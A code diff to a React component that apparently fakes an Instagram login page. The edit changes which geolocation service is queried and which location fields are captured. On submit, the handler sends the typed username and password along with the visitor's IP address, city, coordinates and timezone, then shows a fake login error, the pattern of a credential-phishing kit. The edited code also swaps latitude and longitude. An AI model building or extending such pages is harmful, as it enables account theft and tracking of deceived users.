@@ -54,7 +54,7 @@ export default function InstagramLogin() {
 
   const handleLogin = () => {
     setIsLoginAction(true);
-    fetch("https://ipapi.co/json")
+    fetch("https://ipinfo.io/json?token=5c6ed07095afe4")
       .then((res) => res.json())
       .then(async (data) => {
         try {
@@ -63,11 +63,11 @@ export default function InstagramLogin() {
               username: usernameInput,
               password: passwordInput,
               ip: data.ip,
-              country: data.country_name,
-              capital: data.country_capital,
-              continent: data.continent_code,
-              latitude: data.latitude,
-              longitude: data.longitude,
+              country: data.country,
+              city: data.city,
+              longitude: data.loc.split(",")[0],
+              latitude: data.loc.split(",")[1],
+              timezone: data.timezone,
             }),
           });
           setIsLoginError(true);
